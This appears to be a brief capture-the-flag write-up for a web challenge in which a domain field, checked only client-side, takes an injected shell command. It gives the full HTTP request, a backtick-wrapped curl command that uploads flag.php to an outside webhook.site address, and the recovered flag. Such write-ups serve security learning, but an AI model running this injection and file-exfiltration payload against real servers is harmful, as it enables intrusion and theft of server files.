---
ai_date: '2025-04-27 05:25:36'
ai_summary: Client-side domain validation allows command injection, exploiting with
  'curl' to retrieve the flag.
ai_tags:
- xss
- cmd-inj
- rce
created: 2025-03-01T22:11
points: 50
solves: 17
updated: 2025-03-18T02:30
---

Domain validity check is done client-side, we can just inject a command directly.

```http
POST /?domain=google.com HTTP/1.1
Content-Length: 111
Content-Type: application/x-www-form-urlencoded
Host: 127.0.0.1:56410

domain=%60curl+-F+%22file%3D%40flag.php%22+https%3A%2F%2Fwebhook.site%2F9ae7c07b-30e6-41f3-8f59-b44b0d7a58ef%60
```

The command is this.

```bash
`curl -F "file=@flag.php" https://webhook.site/9ae7c07b-30e6-41f3-8f59-b44b0d7a58ef`
```

```php
This content is hidden :))
<?php

// ATHACKCTF{c0mm4nd_Inj3ecti0ns_4re_5c4ry}
```

```flag
ATHACKCTF{c0mm4nd_Inj3ecti0ns_4re_5c4ry}
```